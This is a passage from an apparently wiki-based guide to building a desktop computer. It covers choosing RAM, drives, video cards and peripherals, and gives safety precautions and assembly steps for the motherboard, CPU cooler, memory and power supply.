SDRAM (Synchronous Dynamic RAM) is labeled by its clock speed in megahertz (MHz). For example, PC133 RAM runs at 133&amp;nbsp;MHz. SDRAM is nearly obsolete, as nearly all motherboards have withdrawn support for SDRAM. It is now superseded by the more efficient DDR RAM.
* 128MB SD-133 = 128MB PC133 RAM

DDR RAM can be labeled in two different ways. It can be labeled by approximate bandwidth; as an example, 400MHz-effective DDR RAM has approximately 3.2&amp;nbsp;GB/s of bandwidth, so it is commonly labeled as PC3200. It can also be labeled by its effective clock speed; 400&amp;nbsp;MHz effective DDR RAM is also known as DDR-400. There is also DDR and DDR2 labeled as PC and PC2.
* 256MB DDR-400 = 256MB PC 3200 RAM
* 256MB DDR2-400 = 256MB PC2 3200 RAM

DDR RAM has three versions: DDR (also DDRI), DDR2 (or DDRII) and DDR3
* DDR supports DDR-200, DDR-266, DDR-333, DDR-400 (mainstream) and DDR-533 (rare)
* DDR2 supports DDR-400, DDR-533, DDR-667, DDR-800, DDR-1066
* DDR3 supports DDR-1333 to DDR-3000

=== Hard drive ===
[[Image:Hdd_medalist.jpg|thumb|right|250px|A hard drive]]

Things to consider when shopping for a hard drive:

; Interface 
: The interface of a drive is how the hard drive communicates with the rest of the computer. The following hard drive interfaces are available:
:* '''[[w:Advanced Technology Attachment|Parallel IDE]] drives''' (PATA, also known as ATA or IDE) use cables that can be distinguished by their wide 40-pin connector, colored first-pin wire, and usually gray &quot;ribbon&quot; style cables. This technology is largely obsolete because SATA uses thinner cables, eliminates contention for the IDE bus that can occur when two PATA drives are attached to the same connector, and promises faster drive access.   
:* '''[[w:SATA|SATA]] drives''' have the advantages outlined above. If you want Serial ATA, you will either need to purchase a motherboard that supports it (all newer motherboards do), or purchase a PCI card that will allow you to connect your hard drive. Note that some older motherboards will not allow you to install Windows XP to a Serial ATA hard drive.
:* '''[[w:SCSI|SCSI]]''', although more expensive and less user friendly, is usually worthwile on high performance workstations and servers. Few consumer desktop motherboards built today support SCSI, and when building a new computer, the work needed to implement SCSI may be outweighed by the relative simplicity and performance of IDE and SATA. SCSI hard drives typically reach rotational speeds of up to 15,000 RPM, and are more expensive.
:* '''[[w:USB|USB]]''' can be used for connecting external drives. An external drive enclosure can convert an internal drive to an external drive.
:*'''[[w:IEEE1394|IEEE1394]]''' This format is most commonly known as &quot;Firewire&quot; (Apple) or &quot;I link&quot; from Sony. The theoretical speed of IEEE1394 is double that of USB 1.0.

; [[w:Cache#Disk_buffer|Cache]] : The cache of a Hard drive is a faster media than the hard drive itself and is normally 8MB (low end and laptop drives), 16MB, 32MB (standard desktop drives), or 64MB (high end, high capacity desktop drives). The existence of a cache increases the speeds of retrieving short bursts of information, and also allows pre-fetching of data. Larger cache sizes generally result in faster data access.

; Form factor
:* 3.5 inch drives are usually used in desktops.
:* 2.5 inch drives are usually used in laptops.

; Capacity : The smallest desktop drives that are widely available hold about 160 gig of data, although the largest drives available on the market can contain 4TB (4000GB). Few people will need disks this large - for most people, somewhere in the range of 300-750GB will be sufficient. The amount of space you will need can depend on many factors, such as how many high-end games and programs you want to install, how many media files you wish to store, or how many high-quality videos you want to render. It is usually better to get a hard drive with a capacity larger than you anticipate using, in case you need more in the future. If you run out of space, you can always add an additional hard drive using any free IDE or Serial ATA connector, or through an external interface, such as USB or FireWire.

; Rotational Speed : The speed at which the hard drives platters spin. Most laptop (2.5 inch) drives spin at 5400 RPM, while common desktop drives come in at 7200. There are PATA and SATA drives that spin at 10,000 RPM and some SCSI drives hit 15,000. However drives above 7,200 RPM usually have limited capacity, and a much higher price than comparable 7,200RPM drives, making such drives advisable only when the fastest possible speeds are required.

; Noise and Heat : Modern hard drives are fairly quiet in operation though some people are sensitive to the faint hum and occasional buzz they do make. If your HD is loud, it’s time to think about replacing it. Hard drives will also throw some heat and adequate air circulation should be provided, usually by case fans. There is software available that will allow you to monitor both the health and temperature of your hard drive(s), it’s a good idea to check from time to time.

; Warranty : Many manufactures offer warranties ranging from 30 days (typically OEM) up to five years. It is well worth spending an extra few dollars to get the drive that carries a longer warranty.

== Secondary components ==
These components are important to your computer, but are not as central as the Core Components.

=== Video output ===
Some form of video output must be provided by the hardware of a computer as to permit the use of an image display. The majority of home and office computers, which predominantly use 2D graphics for office applications and web surfing can use an 'onboard' or integrated graphic processor which will be included on most low to mid range motherboards. For gaming, or 3D modeling, a good quality graphics/video card may be needed and relying on one will undoubtedly permit a simpler upgradeable path. Then there is also high computational tasks from running physics models to process large blocks of data has created a move towards modular Graphical processors units (GPU) that can even be stacked to grant more power, a trend that predates even multiple core cpus.

Currently, two companies dominate the 3D graphics accelerator market; nVIDIA and AMD (formerly known as ATI). nVIDIA and AMD build their own graphics products, and license their technologies to other companies. Both companies make a complete line of cards with entries at every price/performance level, and each brand has its own supporters. Video cards have their own RAM, and many of the same rules that govern the motherboard RAM field apply here: to a point, the more RAM, and the faster it is, the better the performance will be. Most applications require at least 128MB of video RAM, although 512MB is rapidly becoming the new standard. On the other end, 2GB to 6GB video cards top the consumer end of the video card market.  As a rule of thumb, if you want a high end video card, you need a minimum of 1GB of video memory -- preferably 2GB.  Don't be fooled, though; memory is only part of the card and the actual video processor is more important than the memory. 

It is generally better to choose your video card based on your own research, as everyone has slightly different needs. Many video card and chip makers are known to measure their products' performances in ways that you may not find practical. A good video card is often much more than a robust 3D renderer; be sure to examine what you want and need your card to do, such as digital (DVI) output, TV output, multiple-monitor support, built-in TV tuners and video input.  Another reason you need to carefully research is that manufacturers will often use confusing model numbers designed to make a card sound better than it is to sell it better.  For example, the NVIDIA GeForce &quot;GT series claim to be part of the current line up (as of June 2013, the 600-series of cards), however, they are inadequate for modern gaming, in many cases, and perform much closer to old, low-end 400 and 500 series cards than to the GTX 600 series cards. 

Newer technologies such as SLI and Crossfire allow the use of two video cards to render the same video scene, similar to using two CPUs or a dual-core CPU. These systems tend to be expensive, as only some video cards offer this option, and you'll need two of them. However, it can be a useful upgrade path to consider. A SLI-capable motherboard is usually not much more expensive than the regular model, and will work fine with a single video card. You can use it with one card now, and buy another one in the future (which will probably be much cheaper by then), which means you will take advantage of your old video card too.

==== Interface ====
There are four different current graphics card interfaces: integrated, PCI, AGP and PCI-Express.

Most retail computers will ship with an integrated graphics card. It is important to understand that an integrated graphics card uses the system's RAM, and relies heavily on your system's CPU. This will mean slow performance for graphic-intensive software, such as games. Most motherboards that have integrated graphics will also have one of the other three slot interfaces available so it isn't hard to place a new card to suit your needs if the need ever arises. 

Older video cards use the standard PCI slots that are now growing obsolete due to limited speed and memory. These cards are needed for a few rare systems lacking an AGP or PCI-E slot (usually low end desktop systems designed to be cheap.)  They are also useful for adding additional video cards to a system.

Although the AGP standard has now, by and large, been superseded by PCI-E, the cards are still available as are a few motherboards that support them. There are 4 different speed and bandwidths of AGP, 1x, 2x, 4x and 8x. While 8x is the fastest and most common for high end products, the true performance of your AGP card is limited by the lower AGP value of your graphics card and motherboard. For example, an AGP 8x card on a 4x motherboard can only run at up to 4x. AGP has mostly been phased out and there will not be an AGP 16x due to technical limitations.

The newest trend in graphics card is the PCI-Express (not to be confused with PCI-X) system that supports up to 16x speeds. Some graphics cards still come in both AGP and PCI-E 16x models but the newest models of graphics cards are often PCI-E 16x only. While most motherboards have only one PCI-E 16x slot, those with two such slots can combine the power of two video cards using technologies known as SLI for NVidia, and CrossFire for ATI. However, you will have to match the video cards to a motherboard supporting the multiple card technology of choice, and use two similar video cards that both support dual video cards.

Keep in mind that to provide best picture quality your graphics card must be capable of displaying the same resolution as your LCD display's native resolution.

=== CD/DVD ===

[[Image:CD-ROM_drive.jpg|thumb|right|200px|CD-RW writer]]

Optical drives have progressed a long way in the past few years, and you can now easily purchase DVD writers that are capable of burning 9GB of data to a disk for an insignificant amount of money.  Even if you don't plan on watching or copying DVDs on your computer, it is still worth purchasing a burner for their superior backup capabilities.

When purchasing a DVD writer, you will want one that is capable of burning both the '+' and '-' standards, and it should also be Dual Layer compatible.  This will ensure that you can burn to almost all recordable DVDs currently on the market (the other major format, DVD-RAM is almost unused, for the most part, so don't worry about it).

=== Floppy drive ===

[[Image:Diskettenlaufwerk.jpg|thumb|right|150px|3.5&quot; floppy drive]]

Though Floppy drives have been made largely obsolete in recent years by devices such as USB &quot;Thumb Drives&quot; and CD writers, they are often installed anyway because they are sometimes required for BIOS updates and exchanging small files with older computers. Floppy drives block air movement with wide cables, and can make computers set to check the drive take longer to start (most have an option in their BIOS to disable this.). One option to overcome the cable problem and to make it easier to install is to buy an external USB floppy drive, these are potentially a little bit faster and can be plugged into a different system (such as a laptop without a floppy drive.) However, not all systems support booting from a USB floppy drive -- most notably older motherboards. 

It should be noted  that floppy disks are not suitable for long term storage of data, even in a backup role. Never keep your only copy of an important file on a floppy disk.

=== Sound card ===
Most motherboards have built-in sound features. These are often adequate for most users. However, you can purchase a good sound card and speakers at relatively low cost - a few dollars at the low end can make an enormous difference in the range and clarity of sound.  Also, these onboard systems tend to use more system resources, so you are better off with a real sound card for gaming.

Sound card quality depends on a few factors. The digital-analog conversion (DAC) is generally the most important stage for general clarity, but this is hard to measure. Reviews, especially those from audiophile sources, are worth consulting for this; but don't go purely by specifications, as many different models with similar specs can produce completely different results. Cards may offer digital (S/PDIF) output, in which case the DAC process is moved from your sound card either to a dedicated receiver or to one built into your speakers.

Sound cards made for gaming or professional music tend to do outstandingly well for their particular purpose. In games various effects are oftentimes applied to the sound in real-time, and a gaming sound card will be able to do this processing on-board, instead of using your CPU for the task.  Professional music cards tend to be built both for maximum sound quality and low latency (transmission delay) input and output, and include more and/or different kinds of inputs than those of consumer cards.

=== Modem ===
A modem is needed in order to connect to a dial up Internet connection. A modem can also be used for faxing. Modems can attach to the computer in different ways, and can have built-in processing or use the computer's CPU for processing.

Modems with built-in processing generally include all modems that connect via a standard serial port, as well as any modems that refer to themselves as &quot;Hardware Modems&quot;.  Software Modems, or modems that rely on the CPU generally include both Internal and USB modems, or have packaging that mentions drivers or requiring a specific CPU to work.

Modems that rely on the CPU are often designed specifically for the current version of Windows only, and will require drivers that are incompatible with future Windows versions, and may be difficult to upgrade.  Software Modems are also very difficult to find drivers for non-Windows operating systems. The manufacturer is unlikely to support the hardware with new drivers after it is discontinued, forcing you to buy new hardware. Most such modems are internal or external USB, but this is not always the case.

Modems can be attached via USB, a traditional serial port, or an internal card slot. Internal and USB modems are more easily autodetected by the operating system and less likely to have problems with setup. USB and serial port modems often require an extra power supply block.

Gaming modems are normal modems that default to having a low compression setting to reduce lag, but are generally no longer used by gamers, who prefer broadband connections.

=== Network interface card ===
[[Image:Ethernet_pci_card.jpg|thumb|right|150px|Network interface card]]
A Network interface card, or Ethernet card, is required in order to connect to a local area network or a cable or DSL modem.  These typically come in speeds of 10Mbps, 100Mbps, or 1000Mbps (gigabit); these are designated as 10Mbps, 10/100Mbps, or 10/100/1000Mbps products.  The 10/100 and 10/100/1000 parts are most commonly in use today. In many cases, one or two Ethernet adapters will be built into a motherboard. If there are none, you will have to purchase one.  These typically are inserted into a PCI slot. To get the full speed of 10/100/1000Mbps Ethernet, it's best to get a motherboard with that connector built in. A typical Ethernet card usually costs around US$13.

== Peripherals ==
Anything outside the case that connects to your computer is considered a peripheral. The keyboard, mouse and monitor are pretty much the bare minimum you can go with and still be able to interact with your computer. Your choice in peripherals depends on personal preference and what you intend to do with your computer.

=== Mouse and keyboard===
There are, broadly, two types of mouse: optical and mechanical. Mechanical mice use a rubber coated ball bearing that contacts the mousepad or other surface and actually rolls around. Optical mice use a bright light and a sensor to track the movement of the mouse.

When choosing a mouse, there is generally no reason not to choose an optical mouse.  They are considerably lighter (and as such, reduce [[w:Repetitive_strain_injury|RSI]]) as they have no moving parts, they are much better at smoothly tracking movement, and they don’t require constant cleaning like ball mice (though it may be wise to brush off the lens with a q-tip or other soft tool on occasion). Make sure that you spend money on a decent-quality mouse made by companies such as Microsoft or Logitech, as lower-end optical mice will skip if moved too fast. Mice of medium-to-high quality will track your movement almost flawlessly.

Although three buttons are generally enough for operating a computer in normal circumstances, extra buttons can come in handy, as you can add set actions to each button, and they can come in handy for playing various video games.  One thing to note is that with some mice those extra buttons are not actually seen by the computer itself as extra buttons and will not work properly in games.  These buttons use software provided by the manufacturer to function.  However, it is sometimes possible to configure the software to map the button to act like a certain keyboard key so that it will be possible to use it in games in this manner.

Wireless keyboards and mice do not now display the sort of noticeable delay that they once did, and now also have considerably improved battery life. However, gamers may still want to avoid wireless input devices because the very slight delay may impact gaming activities, though some of the higher end models have less trouble with this. The extra weight of the batteries can also be an inconvenience.

=== Printer and scanner ===
For most purposes, a mid-range inkjet printer will work well for most people.  If you plan on printing photos, you will want one that is capable of printing at around 4800dpi.  Also, you will want to compare the speed of various printers, which is usually listed in ppm (pages per minute).  When choosing a printer, always check how much new cartridges cost, as replacement cartridges can quickly outweigh the actual printer's cost.  Be aware of other possible quirks as well.  For example, Epson has protection measures that make refilling your own ink cartridges more difficult because an embedded microchip that keeps track of how much ink has been used keeps the printer from seeing the cartridge as full once it has been emptied.

For office users that plan to do quite a bit of black and white printing buying a black and white laser printer is now an affordable option, and the savings and speed can quickly add up for home office users printing more than 500 pages a month.

Scanners are useful, especially in office settings, they can function with your printer as a photocopier, and with software can also interact with your modem to send Faxes.  When purchasing a Scanner, check to see how &quot;accessible&quot; it is (does it have one-touch buttons), and check how good the scanning quality is, before you leave the store if possible.

Finally, &quot;Multi-Function Centres&quot; (also called &quot;Printer-Scanner-Copiers&quot;) are often a cost-effective solution to purchasing both, as they take up only one port on your computer, and one power point, but remember that they can be a liability, since if one component breaks down, both may need to be replaced.

=== Display ===
When choosing a display for your computer, you have two choices: a Cathode Ray Tube (CRT) screen, or a Liquid Crystal Display (LCD) screen.  Both technologies have their advantages and disadvantages but CRT's, now nearly obsolete, are almost unavailable new - making the argument moot. Used CRT's on the other hand, can be had nearly for free and still work if you have the room for them.

==== LCD panels ====
Liquid Crystal Displays (LCDs) have the advantage of being a completely digital setup, when used with the DVI-D or HDMI digital connectors. When running at the screen's native resolution, this can result in the most stable and sharp image available on current monitors. Many LCD panel displays are sold with an analog 15-pin VGA connector or, rarely, with an analog DVI-I connector. Such displays will be a bit fuzzier than their digital counterparts, and are generally not preferred over a similarly-sized CRT.  If you want an LCD display, be sure to choose a digital setup if you can; however, manufacturers have chosen to use this feature for price differentiation.

The prime disadvantage of LCDs is &quot;dead pixels&quot;, small, failed areas on your monitor, which can be very annoying, but generally aren't covered under warranty; this can make purchasing LCD displays a financial risk.  In fact, most LCD panel manufacturers allow for a certain number of dead pixels in their product specification.

LCDs are acceptable for fast-paced gaming, but you should be sure that your screen has a fairly fast response time (of 12 ms or lower) if you want to play fast games. Nearly all flat panels sold today meet this requirement, some by a factor of 3.

When picking an LCD, keep in mind that they are designed to display at one resolution only, so, to reap the benefits of your screen, your graphics card must be capable of displaying at that resolution. That in mind, they can display lower resolutions with a black frame around the outside (which means your entire screen isn't filled), or by stretching the image (which leads to much lower quality). Running at a higher resolution than your monitor can handle will either make everything on the screen smaller, at a significant quality drop, or will display only a part of the screen at a time.

==== CRT (cathode ray tube) displays ====
The other key type of display is the Cathode Ray Tube (CRT) display. While CRT technology is older, it often outperforms LCD technology in terms of color reproduction (color gamut), although LCD displays are quickly catching up. CRTs are becoming increasingly difficult to find and have almost vanished from mass-market retail. High end CRT's are still available, though they are rapidly being discontinued, and now cost a considerable amount. 

There are two types of CRT displays, ''shadow mask'' and ''aperture grill''. An aperture grill display is brighter and perfectly flat in the vertical direction, but is more fragile and has one or two mostly-unnoticeable thin black lines (support wires) running across the screen. CRTs are generally two to four times as deep as similarly-sized LCDs, and can weigh around 10 times as much. If you purchase a CRT display over the Internet, shipping is much more expensive than an LCD, due to the significantly greater weight.

Sometimes CRTs with a flat screen instead of a curved one are called &quot;flat screens&quot;.  This is not to be confused with the term &quot;flat panel&quot;, used to refer to LCDs.  In order to withstand atmospheric pressure, the glass at the front of a flat screen CRT needs to be very thick, and thus they are limited to diagonal sizes of 20 inches, or so.  A flat screen CRT will be noticeably heavier than its curved screen counterpart.

For improved contrast and readability, some CRTs were manufactured with an anti-reflection coating.  Such tubes make colors appear more vibrant and blacks appear jet black.  Also, if the user has a light from behind, such as from a lighting fixture or windows, annoying reflections on the screen will be much less noticeable.  The coating  typically consists of magnesium fluoride, the same material used to coat binocular optics and some corrective eyeglass lenses.  It is relatively soft, and must be cleaned with care, using special lens cleaning cloths or papers to prevent scratching of the coating.  Another way to clean them is with a boiled 100% cotton flannel cloth and commercial glass cleaning solution, such as Windex.  Oily fingerprints show up very clearly on coated screens, so one should avoid touching them.  With reasonable care, however, the screen may only need to be wet-cleaned once a year and in the meantime can be wiped with a soft dust cloth or brushed with a soft, natural-bristle paint brush to remove any dust that may accumulate.  If you're shopping for such a display on the used market, you will recognize it by the faint, purplish reflection of room lights and daylight. 

Lower-end CRTs use an etched glass tube face.  It gives the glass a dull, non-specular appearance that helps cut down on glare, but such tubes do not provide the high contrast and color brilliance of tubes treated with an anti-reflection coating.

Flicker in CRT's can cause headaches in some people when run at lower frequencies, so it may be ideal to pick a screen offering higher vertical refresh rates at whichever resolutions you intend to use. Most people who have problems with low frequencies (60&amp;nbsp;Hz) find it preferable to have at least 80&amp;nbsp;Hz at the intended resolution. Many won't be bothered by this at all, however.

CRT displays and early LCD displays were developed at a time when television and computers used screens with 4:3 (width x height) aspect ratios.  If your application requires a wide-screen display, even at the expense of reduced performance, a modern 16:9 aspect ratio LCD screen should be chosen instead.

=== Speakers ===
Computer loudspeaker sets come in two general varieties; 2/2.1 sets (over a wide range of quality), and &quot;surround&quot;, &quot;theater&quot;, or &quot;gaming&quot; sets with four or more speakers, which tend to be somewhat more expensive. A 2-speaker set is adequate for basic stereophonic sound.  A 2.1-speaker set adds a sub-woofer to handle low frequencies.  Low-end speakers can suffer from low bass response or inadequate amplification, both of which compromise sound quality. Powered speakers with separate sub-woofers usually cost only a little more and can sound much better. At the higher end, one should start to see features like standard audio cables (instead of manufacturer-specific ones), built in DACs, and a separate control box. 

The surround sets include a sub-woofer, and two or more sets of smaller speakers. These support 5.1 or 7.1 standards that allow sound to be mixed not only left and right, as with standard stereo speakers, but front and back and even behind the listener. Movies and video games make use of this technology to provide a full-immersion experience. Make sure your sound hardware will support 5.1 or 7.1 before buying such a speaker system.  If your budget allows, you can avoid the computer speaker market entirely and look into piecing together a set of higher-end parts. If you are buying a speaker system designed for PCs, research the systems beforehand so you can be certain of getting one that promises clarity rather than just raw power.  Speaker power is usually measured in RMS Watts. However, some cheap speakers use a different measure, Peak Music Power Output (PMPO), which appears much higher.

Headphones can offer good sound much more cheaply than speakers, so if you are on a limited budget, but want maximum quality, they should be considered first.  The advantage of headphones is that the acoustic environment between the audio driver is fully contained and controlled within the earcups and is not dependent on room acoustics.  There are even headphones which promise surround-sound, though these have not been favorably reviewed.

Now that you have selected your parts, you get to what is arguably the most fun part of the process: putting the parts together.

== Tools and equipment ==
[[Image:Cross slot screw.jpg|thumb|right|150px|Combination flanged-hex/Phillips-head screw used in computers]]
You won’t need many tools to assemble your computer, in fact the only one you must have is the screwdriver, but if you can get most of the following together, you’ll find things go a little easier. 

=== Basic tools ===
Before you begin building or refitting a computer, you should have some basic tools:

# #2 Phillips-head (cross-shaped) screwdriver
# Needle-nose pliers
# Anti-static Wrist Strap
# A large level working space

[[Image:Antistatic_wrist_strap.jpg|thumb|right|150px|An [[w:antistatic wrist strap|anti-static wrist strap]] with crocodile clip.]]

=== Optional, but useful tools ===
Some other tools and equipment can come in handy as well, such as:

# Spring action parts grabber.  
# Electrical tape
# Wire or nylon ties
# Flashlight, preferably hands-free
# A second, working computer to swap parts, look for tips, ask for help on-line, download drivers and patches, etc. - very useful
# A can of compressed air - useful when working with older parts that have collected dust. A better alternative but also more costly, is a vacuum cleaner designed for cleaning electronics.

== Preparation ==
Proper preparation is the key to a successful build. Before you begin, make sure you have all the tools you will need, secure a clear, well-lit workspace, gather all the components you’ll be using and unpack them one at a time, verifying that everything that is supposed to be there is actually present. At this point you should leave the parts themselves in their protective anti-static bags, and assemble all the accompanying manuals. Now I know you want to get started, but trust me, ''read the manuals'', check the diagrams, make sure you understand where each part goes and how it attaches. If there is anything you don’t understand, now is the time to do a little extra Internet research or call the manufacturer with your questions.

Find a dry, well-ventilated place to do your work.  You should have plenty of light and if possible, you should choose an area without carpet on the floor, as carpet tends to generate a lot of static.  An unfurnished basement is a good work location.

Safety precautions are important for your own security. Please read the safety precautions thoroughly.
}}

=== Safety precautions ===
# Static electricity is the biggest danger to the expensive parts you are about to assemble, even a tiny shock, much too small for you to feel, can damage or ruin the delicate electronic traces, many times smaller than a human hair, that make up your CPU, RAM and other chips. It’s important to use your anti-static wrist strap to prevent damage to these components. Once you have the power supply installed in the case, clip the end of the wrist strap to the outside of the power supply. (Never plug your computer in while you are connected to it by a wrist strap.) This will ensure that you, the case and the power supply are all connected to a common ground, in other words there will be no inequality of charge that will allow a spark to jump from you to the case. It’s also helpful to have an anti-static mat to set the case and other components on.
# Nobody but you is at fault if you shock your components with static electricity. Make sure that you take the precautions in the previous paragraph to ground yourself from static electricity. (Note: if you really must work on a computer and have not got proper anti-static equipment, it is ''usually'' OK if you make sure that you do not move about much; are not wearing any static-prone clothing; handle components by the edges; and regularly (once a minute or so), touch a grounded object.). The ''case metal'' of your PC's power supply will usually be a suitable grounded object. As noted above, touch it every few minutes while you are working on your PC if you haven’t got a wrist strap.
#Turn off your computer and switch off your Power Supply at the wall before installing or removing any components - if power is flowing to components as they are installed or removed, they can be seriously damaged. In order to have a computer properly grounded, you need it plugged in at the wall but turned off at the power supply and at the wall. The neutral line may be earthed
# Never cut the grounding pin off your power cord. This &quot;safety ground&quot; stands between you and potentially lethal voltages inside the power supply.
# Be wary of sharp edges!  Many lower-end PC cases have sharp, unfinished edges.  This is especially so on interior surfaces, and where the case has been cut or punched-out.  Use care and take your time to avoid cutting your hands.If your case has this problem, a little time with some sandpaper before you begin construction can spare you a lot of pain.
# Dismantling discrete electronic components such as your Power Supply or Monitor is dangerous. They contain high voltage capacitors, which can cause a severe electric shock if you touch them. These hold a charge even when the unit is not plugged in and are capable of delivering a fatal shock.

== Construction ==
Start by putting your case down on your work surface, with the case door facing up, and open the case.

=== Motherboard ===
[[Image:ASRock_K7VT4A_Pro_Mainboard_Labeled_English.svg|center|800px]]

Find the [[w:motherboard|motherboard]] standoffs (spacers) that should have come with the case. They are screws, usually brass, with large hexagonal heads that are tapped so you can fasten screws into the top. These hold the motherboard up off the case preventing a short-circuit. Set these aside.

[[Image:Mainboard_Slotblende_V1a.JPG|thumb|right|250px|I/O Panel Shield of an ATX Motherboard]]

Remove the I/O Shield from the back of the case where the ports on the back of the motherboard will fit, and put in the I/O Shield that came with your motherboard. There may be small metal tabs on the inside of this face plate, if so you may have to adjust them to accommodate the ports on the back of the motherboard.

Some case styles make it difficult to install the motherboard or the CPU with the power supply installed. If the power supply is in your way, take it out and set it aside (we'll put it back in later).
  
Now locate the screw holes on your motherboard and find the corresponding holes on the motherboard plate (or tray) in the case. Put a standoff in each of these holes on the tray and position the motherboard so that you can see the holes in the top of the standoffs through the screw holes in the motherboard.

Now is the time to make sure the ports on the motherboard are mating with the backplate you just installed, and make any necessary adjustments. The small metal tabs are intended to make contact with the metal parts of the connections on the back of the motherboard and ground them, but you may have to bend these tabs a bit to get the ports all properly mounted, this is where those needle-nose pliers may come in handy.

{{DecoratedTextBox|image=Bulbgraph.png| 
If you have trouble lining up the screw holes, double check that you have the standoffs in the proper holes on the tray. With lower quality cases there are sometimes alignment problems and you may have to forgo one or two screws. If this is the case, make sure you remove the corresponding standoffs. Some combinations of motherboards and cases may also use different types of screws in different places or provide non-matching screw holes that cannot be used in a specific case.
The motherboard can possibly be damaged if you try to push it into position with the wrong set of standoffs underneath or when trying to use the wrong set of screw holes.
}}

Now fasten a screw through each of the motherboard screw holes into the standoffs underneath. These screws should be snug but not tight, there is no reason to torque down on them, hand tight is fine, otherwise you can damage the motherboard.

Once the motherboard is installed, it is time to plug the other components.

=== CPU ===
[[Image:Socket_462.saa.jpeg|thumb|An example of a CPU socket, Socket A]]

Installing the CPU, and the CPU’s [[w:Heat sink|heat-sink]] and fan, are by far the most difficult steps you’ll have to complete during your build. Here, more than anywhere else, it will pay to read the instructions carefully, look at the parts, study the diagrams that came with your CPU and/or third party cooling solution, and make sure you thoroughly understand what you are going to do ''before you try to do it''. During the process, if anything does not seem to fit or make sense, put the parts down and look things over carefully before you proceed. Some operations, especially installing the heat-sink/fan combination, can require pretty firm pressure, so don’t be afraid to push a little harder if you’re sure everything is set up correctly.

The details of the installation process differ in slight but important ways for each manufacturer’s processors, and even within a manufacturer's product line. Therefore, for these details, you should rely on the instructions that are provided with the CPU. 

The two things that go wrong the most often and most expensively (minimum of a killed CPU, sometimes more) in building one's own computer are both related to the CPU and its cooler:
#Switching the computer on &quot;just to see if it works&quot; before adding any CPU cooling unit. Without cooling, CPUs heat up at extreme rates (a CPU heats up anywhere between ten times and a thousand times as fast as a cooking area on your stove!) By the time you see the first display on the screen, your CPU will already be severely overheating and might be damaged beyond repair.
#Mounting the CPU cooler improperly. Read the instructions that came with your CPU and cooler very carefully and ensure you are using all components in the correct order and correct place.

If you buy a third party cooling solution for your CPU make sure you get one that is compatible with the CPU you have. Most brands come with multiple mounting brackets that will suit many different chipsets, but it is best to check for compatibility just in case.

If using thermal paste, apply it only to the CPU die (the square piece of silicon in the middle of the CPU) and do so sparingly -- most modern CPUs take no more than a dab of thermal paste the size of a grain of rice.  Some people do like to wipe some onto the heat-sink's surface and then wipe it smoothly off so that bits of it may get into tiny holes for better heat transfer. ''See [http://www.arcticsilver.com/instructions.htm Arctic Silver Instructions] for more info on how to apply and remove thermal paste/grease. (It was written to be specifically for Arctic Silver paste, but the same techniques can be applied to other brands of thermal paste.)''

If using a thermal pad supplied with your cooler, make sure you remove any protective tape from the die just before installing and do not get it dirty - and do not combine thermal pads with thermal paste, it is either one or the other. Then, check that you install the cooler in the right orientation and that you set it flat on the CPU die without exerting undue pressure on any edges or corners - the latter can make small pieces of the die break off, killing the CPU.  

One option you may consider, before installing the heat-sink, is to &quot;lap&quot; the heat-sink, which means to smooth out the bottom surface.  To do this, you will need a very flat surface; a piece of thick window glass will work. Fasten your sandpaper on the flat surface, invert the heat-sink on the sandpaper and sand in small circles, applying minimum pressure. Check frequently and when you see a uniform pattern of scratches, switch to finer grained sandpaper (the numbers go up as the sandpaper is finer, so something such as 220 is coarse while 2000 will be very fine.)  Remember that you are not trying to remove any material, just polish out surface irregularities. If you get it right, you should have a surface which feels completely smooth to the touch (but don’t touch it, the oil in your fingers can cause corrosion of the fresh surface) with a mirror finish.  Some companies producing heat-sinks lap the surface themselves, so if the surface already looks like a perfect mirror, leave it alone.  A lapped heat-sink is more effective as it will have better surface contact with the chip.

Tighten the cooler using only the specified holding devices - if you did everything right, they will fit. If they do not fit, check your setup - most likely something is wrong. After mounting the cooler, connect any power cables for the fan that is attached to the cooler. 

As an aside to the instructions above, it has been my personal experience that fitting the CPU and heat sink is best done on a supportive surface (a telephone directory on a table in my case) prior to installation, to avoid excessive flexing of the motherboard.

If you've got the CPU and its cooler installed, and the motherboard in the case, you’re over the hump, there just a few more easy pieces to go before that momentous first power-up.

=== Memory slots ===
[[Image:DDR2_ram_mounted.jpg|thumb|left|325px|RAM module in a socket]]

Next, you will need to install your RAM (random access memory).  Find the RAM slots on your motherboard; they will look something like the picture on your left. To install the RAM modules, first push on the levers (white plastic in the picture) on either side of the DIMM socket, so that they move to the sides. Do not force them, they should move fairly easily. &lt;!--(They are the white 'handles' you see in the picture.)--&gt;

Put the RAM module in the socket. Line up the notch in the center of the module with the small bump in the center of the RAM socket, making sure to insert it the right way. Push down on the module until both levers move up into the notches on the sides of the module. There should be a small &quot;snap&quot; when the module is fully seated. Although this does require a fair bit of force, do not overdo it or you may break the RAM module.

[[Image:RAM n.jpg|thumb|right|Different types of RAM modules]]

Take a good look at your seated RAM, if one side seems to be higher than the other, odds are it is improperly seated - take it out and try again. As you handle the RAM, try not to touch the copper stripes you can see along the bottom edge, as doing so is the best way to damage the part.

Start adding RAM at the slot labeled &quot;Bank 0&quot; or &quot;DIMM 1&quot;. If you do not have a stick in &quot;Bank 0&quot; or &quot;DIMM 1&quot; the system will think there is no RAM and will not boot.

On newer motherboards with 4 slots, you'll see alternating colours. For example, slot 1 is blue, slot 2 is black, slot 3 is blue, slot 4 is black.

If you were to put 1 gigabyte of RAM in your PC, it is best to use dual channel 512MBx2 sticks. Put the first 512MB stick in '''slot 1''', and put the 2nd stick in '''slot 3''' (the two slots that are blue) - leaving slot 2 empty. This will give you better performance, vs. putting 1GB in slot 1, or two 512MB sticks in slot 1 and 2.

=== Power supply ===
Installing your power supply is pretty straightforward, if it came with your case it was pre-installed and if you took it out earlier to get the motherboard in, now is the time to put it back. Otherwise a few moments of screwdriver work will get the job done. Generally there will be a bracket on the top of the case where the power supply is mounted and a few screws used to fix it in place. Some cases place the Power Supply differently, see the documentation that came with yours.

Some power supplies come with modular cables, so you can plug in only those you’ll be using, now is a good time to figure out what you’ll need and plug them in. Other power supplies have all the cables hardwired in, you’ll want to separate out the ones you’ll need and neatly coil the remainder somewhere out of the way.

If your power supply has a switch to select 115v or 220v make sure it is set properly, this is important. Many newer power supplies can automatically select and don’t have such a switch.

Once you get the power supply installed make sure you check the motherboard documentation carefully for the location of the power sockets. You may then connect the main power, a 20 or 24 pin plug, into the motherboard. There may also be an additional four or eight pin power lead that needs to be plugged in to the motherboard (the CPU power connector) usually located near the processor socket. 

=== Video card ===

[[Image:Fitting-expansion-card.JPG|thumb|right|300px|Insert the card into a matching slot on the motherboard.]]

If your motherboard has a built-in video adapter you want to use, skip this section.

